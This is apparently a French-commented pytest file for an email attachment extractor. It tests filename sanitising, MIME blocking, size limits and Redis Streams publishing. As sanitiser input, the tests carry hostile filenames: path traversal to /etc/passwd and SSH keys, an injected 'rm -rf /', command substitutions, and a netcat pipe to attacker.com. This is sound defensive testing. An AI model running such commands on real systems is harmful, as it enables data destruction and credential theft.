"""
Tests unitaires pour attachment_extractor.py.

Valide :
- sanitize_filename() : path traversal, caractères dangereux, unicode, longueur
- extract_attachments() : success, mime blocked, size overflow, errors
- _publish_document_received() : Redis Streams publication
"""

import uuid
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import pytest
from agents.src.agents.email.attachment_extractor import (
    _publish_document_received,
    extract_attachments,
    sanitize_filename,
)
from agents.src.models.attachment import MAX_ATTACHMENT_SIZE_BYTES


class TestSanitizeFilename:
    """Tests helper sanitize_filename()."""

    def test_sanitize_prevents_path_traversal(self):
        """Path traversal (../../) sécurisé."""
        assert sanitize_filename("../../etc/passwd") == "etc_passwd"
        # Note: .ssh conservé car . est autorisé pour extensions
        assert sanitize_filename("../../../root/.ssh/id_rsa") == "root_.ssh_id_rsa"
        # Note: Normalisation Unicode applique lowercase
        assert sanitize_filename("..\\..\\Windows\\System32") == "windows_system32"

    def test_sanitize_removes_dangerous_characters(self):
        """Caractères dangereux (;, `, $, etc.) supprimés."""
        # Note: - (tiret) conservé car autorisé dans [\w\s\-\.]
        assert sanitize_filename("file; rm -rf /") == "file_rm_-rf"
        # Note: Backticks supprimés proprement
        assert sanitize_filename("file`whoami`") == "file_whoami"
        # Note: Parenthèses fermantes supprimées proprement, pas de trailing underscore
        assert sanitize_filename("file$(cat /etc/passwd)") == "file_cat_etc_passwd"
        assert sanitize_filename("file|nc attacker.com 4444") == "file_nc_attacker.com_4444"

    def test_sanitize_normalizes_spaces(self):
        """Espaces multiples normalisés en underscore unique."""
        assert sanitize_filename("Mon  Document   Final.pdf") == "Mon_Document_Final.pdf"
        assert sanitize_filename("File    with     many     spaces") == "File_with_many_spaces"

    def test_sanitize_normalizes_unicode(self):
        """Unicode (accents) normalisés en ASCII."""
        # Note: Normalisation Unicode NFD fonctionne bien (é→e, ñ→n)
        assert sanitize_filename("Facture été 2025.pdf") == "Facture_ete_2025.pdf"
        assert sanitize_filename("Café résumé.doc") == "Cafe_resume.doc"
        assert sanitize_filename("Español documento.txt") == "Espanol_documento.txt"

    def test_sanitize_lowercase_extensions(self):
        """Extensions converties en lowercase."""
        assert sanitize_filename("Document.PDF") == "Document.pdf"
        assert sanitize_filename("file.EXE") == "file.exe"
        assert sanitize_filename("Photo.JPG") == "Photo.jpg"

    def test_sanitize_limits_length(self):
        """Longueur limitée à max_length (default 200)."""
        long_name = "a" * 300 + ".pdf"
        sanitized = sanitize_filename(long_name, max_length=200)
        assert len(sanitized) == 200
        assert sanitized.endswith(".pdf")

    def test_sanitize_preserves_extension_on_truncate(self):
        """Extension préservée lors de la troncature."""
        long_name = "a" * 250 + ".docx"
        sanitized = sanitize_filename(long_name, max_length=100)
        assert len(sanitized) == 100
        assert sanitized.endswith(".docx")
        assert len(sanitized.split(".docx")[0]) == 95  # 100 - 5 chars extension

    def test_sanitize_strips_leading_trailing_dots_underscores(self):
        """Points/underscores début/fin supprimés."""
        assert sanitize_filename("___file.pdf") == "file.pdf"
        assert sanitize_filename("file.pdf___") == "file.pdf"
        assert sanitize_filename("...document...") == "document"

    def test_sanitize_fallback_unnamed_file(self):
        """Fallback "unnamed_file" si résultat vide."""
        assert sanitize_filename("") == "unnamed_file"
        assert sanitize_filename("   ") == "unnamed_file"
        assert sanitize_filename("...") == "unnamed_file"
        assert sanitize_filename("___") == "unnamed_file"

    def test_sanitize_removes_consecutive_underscores(self):
        """Underscores consécutifs réduits à 1 seul."""
        assert sanitize_filename("file___name.pdf") == "file_name.pdf"
        assert sanitize_filename("document______final.docx") == "document_final.docx"


@pytest.mark.asyncio
class TestExtractAttachments:
    """Tests fonction extract_attachments()."""

    @pytest.fixture
    def mock_emailengine(self):
        """Mock EmailEngine client."""
        client = AsyncMock()
        client.get_message = AsyncMock()
        client.download_attachment = AsyncMock()
        return client

    @pytest.fixture
    def mock_redis(self):
        """Mock Redis client."""
        client = AsyncMock()
        client.xadd = AsyncMock()
        return client

    @pytest.fixture
    def mock_db_pool(self):
        """Mock asyncpg Pool."""
        pool = AsyncMock()
        pool.execute = AsyncMock()
        return pool

    async def test_extract_no_attachments(self, mock_emailengine, mock_redis, mock_db_pool):
        """Email sans attachments → extracted_count=0."""
        email_id = str(uuid.uuid4())

        # Mock EmailEngine : email sans attachments
        mock_emailengine.get_message.return_value = {
            "id": email_id,
            "subject": "Test",
            "attachments": [],
        }

        result = await extract_attachments(
            email_id=email_id,
            db_pool=mock_db_pool,
            emailengine_client=mock_emailengine,
            redis_client=mock_redis,
        )

        assert result.extracted_count == 0
        assert result.failed_count == 0
        assert result.total_size_mb == 0.0
        assert len(result.filepaths) == 0

        # Vérifier pas d'appel download
        mock_emailengine.download_attachment.assert_not_called()

    async def test_extract_single_attachment_success(
        self, mock_emailengine, mock_redis, mock_db_pool
    ):
        """Extraction 1 PJ PDF réussie."""
        email_id = str(uuid.uuid4())

        # Mock EmailEngine
        mock_emailengine.get_message.return_value = {
            "id": email_id,
            "subject": "Facture",
            "attachments": [
                {
                    "id": "att1",
                    "filename": "facture_2026.pdf",
                    "content_type": "application/pdf",
                    "size": 150000,  # 150 Ko
                }
            ],
        }

        mock_emailengine.download_attachment.return_value = b"%PDF-1.4 fake content..."

        # Mock filesystem (patch aiofiles.open)
        with patch("aiofiles.open", create=True) as mock_aiofiles:
            mock_file = AsyncMock()
            mock_file.__aenter__.return_value = mock_file
            mock_file.__aexit__.return_value = None
            mock_file.write = AsyncMock()
            mock_aiofiles.return_value = mock_file

            # Mock Path.mkdir
            with patch.object(Path, "mkdir"):
                result = await extract_attachments(
                    email_id=email_id,
                    db_pool=mock_db_pool,
                    emailengine_client=mock_emailengine,
                    redis_client=mock_redis,
                )

        assert result.extracted_count == 1
        assert result.failed_count == 0
        assert result.total_size_mb == 0.14  # 150000 bytes → 0.14 Mo (arrondi)
        assert len(result.filepaths) == 1

        # Vérifier appel download
        mock_emailengine.download_attachment.assert_called_once_with(email_id, "att1")

        # Vérifier INSERT DB
        assert mock_db_pool.execute.call_count >= 2  # INSERT attachment + UPDATE email

        # Vérifier publication Redis Streams
        mock_redis.xadd.assert_called_once()

    async def test_extract_mime_type_blocked(self, mock_emailengine, mock_redis, mock_db_pool):
        """Attachment avec MIME bloqué (.exe) ignoré."""
        email_id = str(uuid.uuid4())

        # Mock EmailEngine : attachment .exe (bloqué)
        mock_emailengine.get_message.return_value = {
            "id": email_id,
            "subject": "Malware",
            "attachments": [
                {
                    "id": "att1",
                    "filename": "virus.exe",
                    "content_type": "application/x-msdownload",  # Bloqué
                    "size": 50000,
                }
            ],
        }

        result = await extract_attachments(
            email_id=email_id,
            db_pool=mock_db_pool,
            emailengine_client=mock_emailengine,
            redis_client=mock_redis,
        )

        assert result.extracted_count == 0
        assert result.failed_count == 1
        assert result.total_size_mb == 0.0

        # Vérifier PAS d'appel download (bloqué avant)
        mock_emailengine.download_attachment.assert_not_called()

    async def test_extract_attachment_too_large(self, mock_emailengine, mock_redis, mock_db_pool):
        """Attachment >25 Mo ignoré."""
        email_id = str(uuid.uuid4())

        # Mock EmailEngine : attachment 30 Mo (trop gros)
        mock_emailengine.get_message.return_value = {
            "id": email_id,
            "subject": "Video",
            "attachments": [
                {
                    "id": "att1",
                    "filename": "video.mp4",
                    "content_type": "video/mp4",
                    "size": MAX_ATTACHMENT_SIZE_BYTES + 1000000,  # 26 Mo
                }
            ],
        }

        result = await extract_attachments(
            email_id=email_id,
            db_pool=mock_db_pool,
            emailengine_client=mock_emailengine,
            redis_client=mock_redis,
        )

        assert result.extracted_count == 0
        assert result.failed_count == 1

        # Vérifier PAS d'appel download
        mock_emailengine.download_attachment.assert_not_called()

    async def test_extract_download_failure(self, mock_emailengine, mock_redis, mock_db_pool):
        """Échec téléchargement EmailEngine → failed_count++."""
        email_id = str(uuid.uuid4())

        # Mock EmailEngine
        mock_emailengine.get_message.return_value = {
            "id": email_id,
            "subject": "Test",
            "attachments": [
                {
                    "id": "att1",
                    "filename": "test.pdf",
                    "content_type": "application/pdf",
                    "size": 100000,
                }
            ],
        }

        # Mock download failure
        mock_emailengine.download_attachment.side_effect = Exception("Network error")

        result = await extract_attachments(
            email_id=email_id,
            db_pool=mock_db_pool,
            emailengine_client=mock_emailengine,
            redis_client=mock_redis,
        )

        assert result.extracted_count == 0
        assert result.failed_count == 1

    async def test_extract_multiple_attachments_mixed(
        self, mock_emailengine, mock_redis, mock_db_pool
    ):
        """3 attachments : 2 réussies, 1 bloquée."""
        email_id = str(uuid.uuid4())

        # Mock EmailEngine : 3 attachments (PDF OK, image OK, .zip bloqué)
        mock_emailengine.get_message.return_value = {
            "id": email_id,
            "subject": "Multiple",
            "attachments": [
                {
                    "id": "att1",
                    "filename": "doc.pdf",
                    "content_type": "application/pdf",
                    "size": 100000,
                },
                {
                    "id": "att2",
                    "filename": "photo.jpg",
                    "content_type": "image/jpeg",
                    "size": 200000,
                },
                {
                    "id": "att3",
                    "filename": "archive.zip",
                    "content_type": "application/zip",  # Bloqué
                    "size": 50000,
                },
            ],
        }

        mock_emailengine.download_attachment.side_effect = [b"PDF content", b"JPEG content"]

        with patch("aiofiles.open", create=True) as mock_aiofiles:
            mock_file = AsyncMock()
            mock_file.__aenter__.return_value = mock_file
            mock_file.__aexit__.return_value = None
            mock_file.write = AsyncMock()
            mock_aiofiles.return_value = mock_file

            with patch.object(Path, "mkdir"):
                result = await extract_attachments(
                    email_id=email_id,
                    db_pool=mock_db_pool,
                    emailengine_client=mock_emailengine,
                    redis_client=mock_redis,
                )

        assert result.extracted_count == 2
        assert result.failed_count == 1
        assert result.total_size_mb == 0.29  # 300 Ko → 0.29 Mo

    async def test_extract_db_insert_failure(self, mock_emailengine, mock_redis, mock_db_pool):
        """Échec INSERT DB → failed_count++, fichier supprimé."""
        email_id = str(uuid.uuid4())

        # Mock EmailEngine
        mock_emailengine.get_message.return_value = {
            "id": email_id,
            "subject": "Test",
            "attachments": [
                {
                    "id": "att1",
                    "filename": "test.pdf",
                    "content_type": "application/pdf",
                    "size": 100000,
                }
            ],
        }

        mock_emailengine.download_attachment.return_value = b"PDF content"

        # Mock DB INSERT failure
        mock_db_pool.execute.side_effect = Exception("DB error")

        with patch("aiofiles.open", create=True) as mock_aiofiles:
            mock_file = AsyncMock()
            mock_file.__aenter__.return_value = mock_file
            mock_file.__aexit__.return_value = None
            mock_file.write = AsyncMock()
            mock_aiofiles.return_value = mock_file

            with patch.object(Path, "mkdir"):
                with patch("os.remove") as mock_remove:
                    result = await extract_attachments(
                        email_id=email_id,
                        db_pool=mock_db_pool,
                        emailengine_client=mock_emailengine,
                        redis_client=mock_redis,
                    )

                    # Vérifier fichier supprimé après échec INSERT
                    mock_remove.assert_called_once()

        assert result.extracted_count == 0
        assert result.failed_count == 1

    async def test_extract_updates_email_has_attachments(
        self, mock_emailengine, mock_redis, mock_db_pool
    ):
        """UPDATE ingestion.emails SET has_attachments=TRUE si >=1 extraite."""
        email_id = str(uuid.uuid4())

        # Mock EmailEngine
        mock_emailengine.get_message.return_value = {
            "id": email_id,
            "subject": "Test",
            "attachments": [
                {
                    "id": "att1",
                    "filename": "test.pdf",
                    "content_type": "application/pdf",
                    "size": 100000,
                }
            ],
        }

        mock_emailengine.download_attachment.return_value = b"PDF content"

        with patch("aiofiles.open", create=True) as mock_aiofiles:
            mock_file = AsyncMock()
            mock_file.__aenter__.return_value = mock_file
            mock_file.__aexit__.return_value = None
            mock_file.write = AsyncMock()
            mock_aiofiles.return_value = mock_file

            with patch.object(Path, "mkdir"):
                await extract_attachments(
                    email_id=email_id,
                    db_pool=mock_db_pool,
                    emailengine_client=mock_emailengine,
                    redis_client=mock_redis,
                )

        # Vérifier UPDATE email appelé
        update_calls = [
            call
            for call in mock_db_pool.execute.call_args_list
            if "UPDATE ingestion.emails" in str(call)
        ]
        assert len(update_calls) >= 1


@pytest.mark.asyncio
class TestPublishDocumentReceived:
    """Tests helper _publish_document_received()."""

    async def test_publish_success(self):
        """Publication Redis Streams réussie."""
        mock_redis = AsyncMock()
        mock_redis.xadd = AsyncMock()

        await _publish_document_received(
            attachment_id="abc123",
            email_id="xyz789",
            filename="test.pdf",
            filepath="/var/friday/transit/test.pdf",
            mime_type="application/pdf",
            size_bytes=150000,
            redis_client=mock_redis,
        )

        # Vérifier xadd appelé
        mock_redis.xadd.assert_called_once()

        # Vérifier payload
        call_args = mock_redis.xadd.call_args
        assert call_args[0][0] == "document.received"  # Stream name
        payload = call_args[0][1]
        assert payload["attachment_id"] == "abc123"
        assert payload["email_id"] == "xyz789"
        assert payload["filename"] == "test.pdf"
        assert payload["source"] == "email"

        # Vérifier maxlen
        assert call_args[1]["maxlen"] == 10000

    async def test_publish_failure_raises(self):
        """Échec publication Redis raise exception."""
        mock_redis = AsyncMock()
        mock_redis.xadd.side_effect = Exception("Redis down")

        with pytest.raises(Exception) as exc_info:
            await _publish_document_received(
                attachment_id="abc123",
                email_id="xyz789",
                filename="test.pdf",
                filepath="/var/friday/transit/test.pdf",
                mime_type="application/pdf",
                size_bytes=150000,
                redis_client=mock_redis,
            )

        assert "Redis down" in str(exc_info.value)
